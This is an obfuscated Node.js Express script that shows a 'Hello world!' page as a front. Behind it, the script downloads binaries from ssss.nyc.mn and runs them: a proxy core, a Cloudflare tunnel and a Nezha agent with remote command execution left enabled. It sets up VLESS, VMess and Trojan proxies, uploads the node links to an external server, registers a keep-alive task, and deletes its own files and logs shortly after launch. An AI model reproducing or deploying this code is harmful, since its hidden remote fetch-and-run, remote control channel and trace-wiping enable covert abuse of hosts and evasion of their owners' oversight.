const _0x2fb928=_0x1443;(function(_0x40ce27,_0x5e19f6){const _0x39b5d0=_0x1443,_0x12e53d=_0x40ce27();while(!![]){try{const _0x5b16ba=-parseInt(_0x39b5d0(0x74))/0x1+-parseInt(_0x39b5d0(0xde))/0x2+-parseInt(_0x39b5d0(0xea))/0x3+parseInt(_0x39b5d0(0xff))/0x4*(-parseInt(_0x39b5d0(0x12d))/0x5)+-parseInt(_0x39b5d0(0x7a))/0x6+-parseInt(_0x39b5d0(0xdf))/0x7+-parseInt(_0x39b5d0(0x115))/0x8*(-parseInt(_0x39b5d0(0xaf))/0x9);if(_0x5b16ba===_0x5e19f6)break;else _0x12e53d['push'](_0x12e53d['shift']());}catch(_0x4b94d0){_0x12e53d['push'](_0x12e53d['shift']());}}}(_0x4f10,0x1bec7));const express=require('express'),app=express(),axios=require(_0x2fb928(0xf4)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x2fb928(0x98)),exec=promisify(require(_0x2fb928(0x12e))[_0x2fb928(0x81)]),{execSync}=require(_0x2fb928(0x12e)),UPLOAD_URL=process['env'][_0x2fb928(0xbe)]||'',PROJECT_URL=process[_0x2fb928(0xed)][_0x2fb928(0xeb)]||'',AUTO_ACCESS=process[_0x2fb928(0xed)][_0x2fb928(0xe3)]||![],FILE_PATH=process[_0x2fb928(0xed)]['FILE_PATH']||_0x2fb928(0xb2),SUB_PATH=process[_0x2fb928(0xed)][_0x2fb928(0xbd)]||_0x2fb928(0xd3),PORT=process[_0x2fb928(0xed)][_0x2fb928(0x79)]||process['env'][_0x2fb928(0xa6)]||0xbb8,UUID=process['env'][_0x2fb928(0xad)]||_0x2fb928(0x108),NEZHA_SERVER=process[_0x2fb928(0xed)][_0x2fb928(0xb4)]||'',NEZHA_PORT=process[_0x2fb928(0xed)]['NEZHA_PORT']||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||'',ARGO_AUTH=process['env'][_0x2fb928(0xcc)]||'',ARGO_PORT=process[_0x2fb928(0xed)][_0x2fb928(0x97)]||0x1f41,CFIP=process[_0x2fb928(0xed)]['CFIP']||'cdns.doon.eu.org',CFPORT=process[_0x2fb928(0xed)]['CFPORT']||0x1bb,NAME=process[_0x2fb928(0xed)][_0x2fb928(0x80)]||'ceshi';!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+'\x20already\x20exists');function _0x1443(_0x2a29fa,_0x58dc60){const _0x4f10d3=_0x4f10();return _0x1443=function(_0x144349,_0x208421){_0x144349=_0x144349-0x6e;let _0x28c2e8=_0x4f10d3[_0x144349];return _0x28c2e8;},_0x1443(_0x2a29fa,_0x58dc60);}function generateRandomName(){const _0x35f234=_0x2fb928,_0x4445da=_0x35f234(0x10d);let _0x28bb4f='';for(let _0x117e92=0x0;_0x117e92<0x6;_0x117e92++){_0x28bb4f+=_0x4445da[_0x35f234(0x7d)](Math[_0x35f234(0x8d)](Math['random']()*_0x4445da['length']));}return _0x28bb4f;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2fb928(0x9f)](FILE_PATH,npmName),phpPath=path[_0x2fb928(0x9f)](FILE_PATH,phpName),webPath=path[_0x2fb928(0x9f)](FILE_PATH,webName),botPath=path[_0x2fb928(0x9f)](FILE_PATH,botName),subPath=path[_0x2fb928(0x9f)](FILE_PATH,_0x2fb928(0x111)),listPath=path[_0x2fb928(0x9f)](FILE_PATH,_0x2fb928(0x105)),bootLogPath=path[_0x2fb928(0x9f)](FILE_PATH,_0x2fb928(0xee)),configPath=path[_0x2fb928(0x9f)](FILE_PATH,_0x2fb928(0x86));function deleteNodes(){const _0x1f468d=_0x2fb928;try{if(!UPLOAD_URL)return;if(!fs[_0x1f468d(0xe6)](subPath))return;let _0xbc02ce;try{_0xbc02ce=fs['readFileSync'](subPath,_0x1f468d(0xd0));}catch{return null;}const _0x5025c4=Buffer[_0x1f468d(0xb6)](_0xbc02ce,_0x1f468d(0x10c))[_0x1f468d(0xfa)]('utf-8'),_0x22773b=_0x5025c4[_0x1f468d(0xf0)]('\x0a')[_0x1f468d(0xb3)](_0x2b2ffa=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1f468d(0x102)](_0x2b2ffa));if(_0x22773b[_0x1f468d(0x122)]===0x0)return;return axios[_0x1f468d(0x8c)](UPLOAD_URL+_0x1f468d(0xc8),JSON['stringify']({'nodes':_0x22773b}),{'headers':{'Content-Type':'application/json'}})[_0x1f468d(0xcd)](_0x5af260=>{return null;}),null;}catch(_0x45a2be){return null;}}function cleanupOldFiles(){try{const _0x51967d=fs['readdirSync'](FILE_PATH);_0x51967d['forEach'](_0x1e339a=>{const _0x3e0f2f=_0x1443,_0x40a1a0=path[_0x3e0f2f(0x9f)](FILE_PATH,_0x1e339a);try{const _0x1966af=fs[_0x3e0f2f(0x107)](_0x40a1a0);_0x1966af[_0x3e0f2f(0xe5)]()&&fs[_0x3e0f2f(0xf7)](_0x40a1a0);}catch(_0x40cefa){}});}catch(_0x429b1a){}}app[_0x2fb928(0xbb)]('/',function(_0x2752f0,_0x46fc98){const _0x3cb699=_0x2fb928;_0x46fc98[_0x3cb699(0x121)](_0x3cb699(0xa7));});async function generateConfig(){const _0x47fdf6=_0x2fb928,_0x23cd87={'log':{'access':'/dev/null','error':_0x47fdf6(0xef),'loglevel':_0x47fdf6(0xba)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x47fdf6(0xd7)}],'decryption':_0x47fdf6(0xba),'fallbacks':[{'dest':0xbb9},{'path':_0x47fdf6(0xb5),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x47fdf6(0x82),'dest':0xbbc}]},'streamSettings':{'network':_0x47fdf6(0xb0)}},{'port':0xbb9,'listen':_0x47fdf6(0xc0),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x47fdf6(0xba)},'streamSettings':{'network':_0x47fdf6(0xb0),'security':'none'}},{'port':0xbba,'listen':_0x47fdf6(0xc0),'protocol':_0x47fdf6(0x90),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x47fdf6(0xba)},'streamSettings':{'network':'ws','security':_0x47fdf6(0xba),'wsSettings':{'path':_0x47fdf6(0xb5)}},'sniffing':{'enabled':!![],'destOverride':[_0x47fdf6(0xdc),_0x47fdf6(0x120),_0x47fdf6(0x116)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x47fdf6(0xc0),'protocol':_0x47fdf6(0x10f),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x47fdf6(0x9e)}},'sniffing':{'enabled':!![],'destOverride':[_0x47fdf6(0xdc),'tls',_0x47fdf6(0x116)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x47fdf6(0xc0),'protocol':_0x47fdf6(0xe2),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x47fdf6(0xba),'wsSettings':{'path':_0x47fdf6(0x82)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x47fdf6(0x120),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x47fdf6(0xa0)]},'outbounds':[{'protocol':_0x47fdf6(0x9d),'tag':_0x47fdf6(0xc9)},{'protocol':_0x47fdf6(0x11b),'tag':_0x47fdf6(0xf2)}]};fs[_0x47fdf6(0xc7)](path['join'](FILE_PATH,'config.json'),JSON[_0x47fdf6(0x71)](_0x23cd87,null,0x2));}function _0x4f10(){const _0x36c130=['https://arm64.ssss.nyc.mn/v1','Empowerment\x20success\x20for\x20','freedom','/vmess-argo','join','https+local://8.8.8.8/dns-query','&path=%2Fvless-argo%3Fed%3D2560#','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20tunnel:\x20','2053','https://arm64.ssss.nyc.mn/web','PORT','Hello\x20world!','TunnelSecret','tunnel.yml','basename','clear','\x20>\x20nul\x202>&1','UUID','aarch64','9RXFcCj','tcp','2083','./tmp','filter','NEZHA_SERVER','/vless-argo','from','\x0avless://','true','push','none','get','close','SUB_PATH','UPLOAD_URL','8443','127.0.0.1','Error\x20executing\x20command:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','pkill\x20-f\x20\x22[','readFileSync','2096','map','writeFileSync','/api/delete-nodes','direct','response','Download\x20','ARGO_AUTH','catch','\x20-c\x20\x22','\x20failed:\x20','utf-8','\x20-c\x20','\x20is\x20running','sub','automatic\x20access\x20task\x20added\x20successfully','match','fileUrl','xtls-rprx-vision','\x20successfully','443','firefox','Add\x20automatic\x20access\x20task\x20faild:\x20','http','listen','330886kfpDLQ','1373645CQRGYe','ARGO_DOMAIN:','/api/add-nodes','trojan','AUTO_ACCESS','Empowerment\x20failed\x20for\x20','isFile','existsSync','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Error\x20in\x20startserver:','has','500283QPtiij','PROJECT_URL','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','env','boot.log','/dev/null','split','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','block','config.yaml','axios','includes','then','unlinkSync','createWriteStream','\x22\x20>\x20/dev/null\x202>&1','toString','http\x20server\x20is\x20running\x20on\x20port:','false','\x20-p\x20','\x20>/dev/null\x202>&1\x20&','220KhLSwq','application/json','/sub.txt\x20saved\x20successfully','test','\x20>/dev/null\x202>&1','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','list.txt','Skipping\x20adding\x20automatic\x20access\x20task','statSync','37b7ec45-1978-48b7-bd31-af3ff69faae2','unshift','.exe\x20>\x20nul\x202>&1','--tls','base64','abcdefghijklmnopqrstuvwxyz','platform','vmess','data','sub.txt','Content-Type','/api/add-subscriptions','\x0a\x20\x20\x0atrojan://','8932760OoBcIk','quic','App\x20is\x20running','tunnel.json','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','blackhole','taskkill\x20/f\x20/im\x20','rm\x20-rf\x20','2087','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tls','send','length','&path=%2Ftrojan-argo%3Fed%3D2560#','Error\x20downloading\x20files:','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x0aclient_secret:\x20','\x0a\x20\x20\x20\x20','arm','https://oooo.serv00.net/add-url','\x20-s\x20','del\x20/f\x20/q\x20','20525BzYMex','child_process','amd','win32','php\x20running\x20error:\x20','substring','stringify','message','nohup\x20','26268qsrOfy','/vmess-argo?ed=2560','NEZHA\x20variable\x20is\x20empty,skip\x20running','stream','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','SERVER_PORT','1330428aVBLST','status','\x0a\x20\x20credentials-file:\x20','charAt','arm64','pipe','NAME','exec','/trojan-argo','https://arm64.ssss.nyc.mn/agent','Unhandled\x20error\x20in\x20startserver:','&fp=firefox&type=ws&host=','config.json','text/plain;\x20charset=utf-8','finish','trim','forEach','https://arm64.ssss.nyc.mn/bot','post','floor','Nodes\x20uploaded\x20successfully','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','vless','log','all','npm\x20running\x20error:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','ARGO_PORT','util','?encryption=none&security=tls&sni=','error'];_0x4f10=function(){return _0x36c130;};return _0x4f10();}function getSystemArchitecture(){const _0x291006=_0x2fb928,_0x576dd4=os['arch']();return _0x576dd4===_0x291006(0x129)||_0x576dd4===_0x291006(0x7e)||_0x576dd4===_0x291006(0xae)?_0x291006(0x129):_0x291006(0x12f);}function downloadFile(_0x13612c,_0x4eada2,_0x1214db){const _0x375efa=_0x2fb928,_0x4c46a5=_0x13612c;!fs[_0x375efa(0xe6)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x3f561c=fs[_0x375efa(0xf8)](_0x4c46a5);axios({'method':'get','url':_0x4eada2,'responseType':_0x375efa(0x77)})[_0x375efa(0xf6)](_0x4af921=>{const _0x14c256=_0x375efa;_0x4af921[_0x14c256(0x110)][_0x14c256(0x7f)](_0x3f561c),_0x3f561c['on'](_0x14c256(0x88),()=>{const _0x17dfbe=_0x14c256;_0x3f561c[_0x17dfbe(0xbc)](),console[_0x17dfbe(0x91)](_0x17dfbe(0xcb)+path[_0x17dfbe(0xaa)](_0x4c46a5)+_0x17dfbe(0xd8)),_0x1214db(null,_0x4c46a5);}),_0x3f561c['on'](_0x14c256(0x9a),_0x478a7b=>{const _0x47106a=_0x14c256;fs['unlink'](_0x4c46a5,()=>{});const _0x1513d2=_0x47106a(0xcb)+path['basename'](_0x4c46a5)+_0x47106a(0xcf)+_0x478a7b['message'];console['error'](_0x1513d2),_0x1214db(_0x1513d2);});})[_0x375efa(0xcd)](_0x5c1b5f=>{const _0x118f7b=_0x375efa,_0x29e067=_0x118f7b(0xcb)+path[_0x118f7b(0xaa)](_0x4c46a5)+_0x118f7b(0xcf)+_0x5c1b5f[_0x118f7b(0x72)];console[_0x118f7b(0x9a)](_0x29e067),_0x1214db(_0x29e067);});}async function downloadFilesAndRun(){const _0x15bf83=_0x2fb928,_0x587a15=getSystemArchitecture(),_0x5c5bf6=getFilesForArchitecture(_0x587a15);if(_0x5c5bf6[_0x15bf83(0x122)]===0x0){console['log'](_0x15bf83(0x96));return;}const _0x31479e=_0x5c5bf6[_0x15bf83(0xc6)](_0x34f7d3=>{return new Promise((_0x3ec8be,_0x571b42)=>{const _0x5eb75f=_0x1443;downloadFile(_0x34f7d3['fileName'],_0x34f7d3[_0x5eb75f(0xd6)],(_0x3ecd23,_0x3752fe)=>{_0x3ecd23?_0x571b42(_0x3ecd23):_0x3ec8be(_0x3752fe);});});});try{await Promise[_0x15bf83(0x92)](_0x31479e);}catch(_0x51dcc7){console[_0x15bf83(0x9a)](_0x15bf83(0x124),_0x51dcc7);return;}function _0xe9a732(_0x37232e){const _0xf96088=_0x15bf83,_0x321590=0x1fd;_0x37232e[_0xf96088(0x8a)](_0x2123c6=>{const _0x49cf2f=_0xf96088;fs[_0x49cf2f(0xe6)](_0x2123c6)&&fs['chmod'](_0x2123c6,_0x321590,_0x3c9ea4=>{const _0x5cd8ef=_0x49cf2f;_0x3c9ea4?console[_0x5cd8ef(0x9a)](_0x5cd8ef(0xe4)+_0x2123c6+':\x20'+_0x3c9ea4):console['log'](_0x5cd8ef(0x9c)+_0x2123c6+':\x20'+_0x321590[_0x5cd8ef(0xfa)](0x8));});});}const _0x440239=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xe9a732(_0x440239);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x40b270=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x481a15=new Set([_0x15bf83(0xd9),_0x15bf83(0xbf),_0x15bf83(0xc5),_0x15bf83(0x11e),_0x15bf83(0xb1),_0x15bf83(0xa4)]),_0x2abcde=_0x481a15[_0x15bf83(0xe9)](_0x40b270)?_0x15bf83(0xb8):_0x15bf83(0xfc),_0x52a489=_0x15bf83(0x127)+NEZHA_KEY+_0x15bf83(0x119)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x2abcde+_0x15bf83(0x94)+UUID;fs[_0x15bf83(0xc7)](path[_0x15bf83(0x9f)](FILE_PATH,_0x15bf83(0xf3)),_0x52a489);const _0x210e56=_0x15bf83(0x73)+phpPath+_0x15bf83(0xce)+FILE_PATH+_0x15bf83(0xa2);try{await exec(_0x210e56),console[_0x15bf83(0x91)](phpName+_0x15bf83(0xd2)),await new Promise(_0x5bbf03=>setTimeout(_0x5bbf03,0x3e8));}catch(_0x1aaf6f){console['error'](_0x15bf83(0x6f)+_0x1aaf6f);}}else{let _0x498660='';const _0xec192a=[_0x15bf83(0xd9),_0x15bf83(0xbf),_0x15bf83(0xc5),'2087',_0x15bf83(0xb1),_0x15bf83(0xa4)];_0xec192a[_0x15bf83(0xf5)](NEZHA_PORT)&&(_0x498660=_0x15bf83(0x10b));const _0x1bf2c6='nohup\x20'+npmPath+_0x15bf83(0x12b)+NEZHA_SERVER+':'+NEZHA_PORT+_0x15bf83(0xfd)+NEZHA_KEY+'\x20'+_0x498660+_0x15bf83(0xe7);try{await exec(_0x1bf2c6),console[_0x15bf83(0x91)](npmName+_0x15bf83(0xd2)),await new Promise(_0x3ec5df=>setTimeout(_0x3ec5df,0x3e8));}catch(_0x7fe2d9){console[_0x15bf83(0x9a)](_0x15bf83(0x93)+_0x7fe2d9);}}}else console['log'](_0x15bf83(0x76));const _0x3a2be0=_0x15bf83(0x73)+webPath+_0x15bf83(0xd1)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3a2be0),console[_0x15bf83(0x91)](webName+_0x15bf83(0xd2)),await new Promise(_0x176515=>setTimeout(_0x176515,0x3e8));}catch(_0x590d5e){console[_0x15bf83(0x9a)]('web\x20running\x20error:\x20'+_0x590d5e);}if(fs[_0x15bf83(0xe6)](botPath)){let _0x332ac6;if(ARGO_AUTH[_0x15bf83(0xd5)](/^[A-Z0-9a-z=]{120,250}$/))_0x332ac6=_0x15bf83(0x11a)+ARGO_AUTH;else ARGO_AUTH[_0x15bf83(0xd5)](/TunnelSecret/)?_0x332ac6=_0x15bf83(0x95)+FILE_PATH+'/tunnel.yml\x20run':_0x332ac6=_0x15bf83(0xec)+FILE_PATH+_0x15bf83(0x104)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x332ac6+'\x20>/dev/null\x202>&1\x20&'),console[_0x15bf83(0x91)](botName+_0x15bf83(0xd2)),await new Promise(_0x52f440=>setTimeout(_0x52f440,0x7d0));}catch(_0xeaaa8d){console[_0x15bf83(0x9a)](_0x15bf83(0xc1)+_0xeaaa8d);}}await new Promise(_0x112a0e=>setTimeout(_0x112a0e,0x1388));}function getFilesForArchitecture(_0x5c6101){const _0x351b32=_0x2fb928;let _0x5b70d6;_0x5c6101===_0x351b32(0x129)?_0x5b70d6=[{'fileName':webPath,'fileUrl':_0x351b32(0xa5)},{'fileName':botPath,'fileUrl':_0x351b32(0x8b)}]:_0x5b70d6=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x497b74=_0x5c6101===_0x351b32(0x129)?_0x351b32(0x83):'https://amd64.ssss.nyc.mn/agent';_0x5b70d6[_0x351b32(0x109)]({'fileName':npmPath,'fileUrl':_0x497b74});}else{const _0x209521=_0x5c6101==='arm'?_0x351b32(0x9b):'https://amd64.ssss.nyc.mn/v1';_0x5b70d6[_0x351b32(0x109)]({'fileName':phpPath,'fileUrl':_0x209521});}}return _0x5b70d6;}function argoType(){const _0xd1bbf7=_0x2fb928;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0xd1bbf7(0x125));return;}if(ARGO_AUTH[_0xd1bbf7(0xf5)](_0xd1bbf7(0xa8))){fs[_0xd1bbf7(0xc7)](path['join'](FILE_PATH,_0xd1bbf7(0x118)),ARGO_AUTH);const _0x4fe411=_0xd1bbf7(0xa3)+ARGO_AUTH[_0xd1bbf7(0xf0)]('\x22')[0xb]+_0xd1bbf7(0x7c)+path[_0xd1bbf7(0x9f)](FILE_PATH,_0xd1bbf7(0x118))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0xd1bbf7(0xc2)+ARGO_PORT+_0xd1bbf7(0x78);fs[_0xd1bbf7(0xc7)](path[_0xd1bbf7(0x9f)](FILE_PATH,_0xd1bbf7(0xa9)),_0x4fe411);}else console[_0xd1bbf7(0x91)](_0xd1bbf7(0x11f));}argoType();async function extractDomains(){const _0x5a1164=_0x2fb928;let _0x41f0a1;if(ARGO_AUTH&&ARGO_DOMAIN)_0x41f0a1=ARGO_DOMAIN,console['log'](_0x5a1164(0xe0),_0x41f0a1),await _0x5b51e5(_0x41f0a1);else try{const _0x501eaf=fs[_0x5a1164(0xc4)](path['join'](FILE_PATH,'boot.log'),'utf-8'),_0x3b4be5=_0x501eaf[_0x5a1164(0xf0)]('\x0a'),_0x3f42a8=[];_0x3b4be5[_0x5a1164(0x8a)](_0x37b862=>{const _0x1e61d5=_0x5a1164,_0x5dd937=_0x37b862[_0x1e61d5(0xd5)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5dd937){const _0x3f63be=_0x5dd937[0x1];_0x3f42a8[_0x1e61d5(0xb9)](_0x3f63be);}});if(_0x3f42a8[_0x5a1164(0x122)]>0x0)_0x41f0a1=_0x3f42a8[0x0],console[_0x5a1164(0x91)]('ArgoDomain:',_0x41f0a1),await _0x5b51e5(_0x41f0a1);else{console[_0x5a1164(0x91)](_0x5a1164(0x126)),fs[_0x5a1164(0xf7)](path[_0x5a1164(0x9f)](FILE_PATH,_0x5a1164(0xee)));async function _0x3c5667(){const _0x5662c7=_0x5a1164;try{process[_0x5662c7(0x10e)]===_0x5662c7(0x6e)?await exec(_0x5662c7(0x11c)+botName+_0x5662c7(0x10a)):await exec(_0x5662c7(0xc3)+botName[_0x5662c7(0x7d)](0x0)+']'+botName[_0x5662c7(0x70)](0x1)+_0x5662c7(0xf9));}catch(_0x4c1f9b){}}_0x3c5667(),await new Promise(_0x17c0c3=>setTimeout(_0x17c0c3,0xbb8));const _0x4023b6='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x5a1164(0x104)+ARGO_PORT;try{await exec(_0x5a1164(0x73)+botPath+'\x20'+_0x4023b6+_0x5a1164(0xfe)),console[_0x5a1164(0x91)](botName+_0x5a1164(0xd2)),await new Promise(_0x801c4f=>setTimeout(_0x801c4f,0xbb8)),await extractDomains();}catch(_0x39a2bd){console[_0x5a1164(0x9a)](_0x5a1164(0xc1)+_0x39a2bd);}}}catch(_0x2efd55){console[_0x5a1164(0x9a)]('Error\x20reading\x20boot.log:',_0x2efd55);}async function _0x5b51e5(_0x7c0069){const _0x10c7cb=_0x5a1164,_0x5d8dfb=execSync(_0x10c7cb(0xf1),{'encoding':_0x10c7cb(0xd0)}),_0x128daa=_0x5d8dfb[_0x10c7cb(0x89)](),_0x4abaf7=NAME?NAME+'-'+_0x128daa:_0x128daa;return new Promise(_0x212b78=>{setTimeout(()=>{const _0x2943f0=_0x1443,_0x40401d={'v':'2','ps':''+_0x4abaf7,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2943f0(0xba),'net':'ws','type':_0x2943f0(0xba),'host':_0x7c0069,'path':_0x2943f0(0x75),'tls':_0x2943f0(0x120),'sni':_0x7c0069,'alpn':'','fp':_0x2943f0(0xda)},_0x4437eb=_0x2943f0(0xb7)+UUID+'@'+CFIP+':'+CFPORT+_0x2943f0(0x99)+_0x7c0069+'&fp=firefox&type=ws&host='+_0x7c0069+_0x2943f0(0xa1)+_0x4abaf7+'\x0a\x20\x20\x0avmess://'+Buffer['from'](JSON[_0x2943f0(0x71)](_0x40401d))['toString'](_0x2943f0(0x10c))+_0x2943f0(0x114)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x7c0069+_0x2943f0(0x85)+_0x7c0069+_0x2943f0(0x123)+_0x4abaf7+_0x2943f0(0x128);console[_0x2943f0(0x91)](Buffer['from'](_0x4437eb)[_0x2943f0(0xfa)](_0x2943f0(0x10c))),fs['writeFileSync'](subPath,Buffer['from'](_0x4437eb)[_0x2943f0(0xfa)]('base64')),console[_0x2943f0(0x91)](FILE_PATH+_0x2943f0(0x101)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x3500e1,_0x559169)=>{const _0x356fa8=_0x2943f0,_0x2db4f9=Buffer[_0x356fa8(0xb6)](_0x4437eb)['toString']('base64');_0x559169['set'](_0x356fa8(0x112),_0x356fa8(0x87)),_0x559169['send'](_0x2db4f9);}),_0x212b78(_0x4437eb);},0x7d0);});}}async function uploadNodes(){const _0x3e5313=_0x2fb928;if(UPLOAD_URL&&PROJECT_URL){const _0x52a208=PROJECT_URL+'/'+SUB_PATH,_0x5d2eae={'subscription':[_0x52a208]};try{const _0xfda42f=await axios[_0x3e5313(0x8c)](UPLOAD_URL+_0x3e5313(0x113),_0x5d2eae,{'headers':{'Content-Type':_0x3e5313(0x100)}});return _0xfda42f&&_0xfda42f[_0x3e5313(0x7b)]===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),_0xfda42f):null;}catch(_0x35684b){if(_0x35684b[_0x3e5313(0xca)]){if(_0x35684b[_0x3e5313(0xca)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3e5313(0xe6)](listPath))return;const _0x161321=fs[_0x3e5313(0xc4)](listPath,_0x3e5313(0xd0)),_0x3c6b4b=_0x161321[_0x3e5313(0xf0)]('\x0a')[_0x3e5313(0xb3)](_0xa82925=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3e5313(0x102)](_0xa82925));if(_0x3c6b4b[_0x3e5313(0x122)]===0x0)return;const _0x441354=JSON[_0x3e5313(0x71)]({'nodes':_0x3c6b4b});try{const _0x36703c=await axios[_0x3e5313(0x8c)](UPLOAD_URL+_0x3e5313(0xe1),_0x441354,{'headers':{'Content-Type':'application/json'}});return _0x36703c&&_0x36703c[_0x3e5313(0x7b)]===0xc8?(console[_0x3e5313(0x91)](_0x3e5313(0x8e)),_0x36703c):null;}catch(_0x5bfa23){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4cd8fc=_0x1443,_0x30a6d2=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x30a6d2[_0x4cd8fc(0xb9)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x30a6d2['push'](phpPath);process[_0x4cd8fc(0x10e)]===_0x4cd8fc(0x6e)?exec(_0x4cd8fc(0x12c)+_0x30a6d2[_0x4cd8fc(0x9f)]('\x20')+_0x4cd8fc(0xac),_0x4f727f=>{const _0x1be400=_0x4cd8fc;console[_0x1be400(0xab)](),console[_0x1be400(0x91)](_0x1be400(0x117)),console[_0x1be400(0x91)](_0x1be400(0x8f));}):exec(_0x4cd8fc(0x11d)+_0x30a6d2[_0x4cd8fc(0x9f)]('\x20')+_0x4cd8fc(0x103),_0x4c609c=>{const _0x5915af=_0x4cd8fc;console[_0x5915af(0xab)](),console[_0x5915af(0x91)](_0x5915af(0x117)),console[_0x5915af(0x91)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x550e65=_0x2fb928;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x550e65(0x91)](_0x550e65(0x106));return;}try{const _0x1b6c3c=await axios['post'](_0x550e65(0x12a),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x550e65(0x100)}});return console[_0x550e65(0x91)](_0x550e65(0xd4)),_0x1b6c3c;}catch(_0x17234a){return console['error'](_0x550e65(0xdb)+_0x17234a['message']),null;}}async function startserver(){const _0x246ab7=_0x2fb928;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x31501c){console[_0x246ab7(0x9a)](_0x246ab7(0xe8),_0x31501c);}}startserver()[_0x2fb928(0xcd)](_0x51dedd=>{const _0xfba9b4=_0x2fb928;console[_0xfba9b4(0x9a)](_0xfba9b4(0x84),_0x51dedd);}),app[_0x2fb928(0xdd)](PORT,()=>console[_0x2fb928(0x91)](_0x2fb928(0xfb)+PORT+'!'));
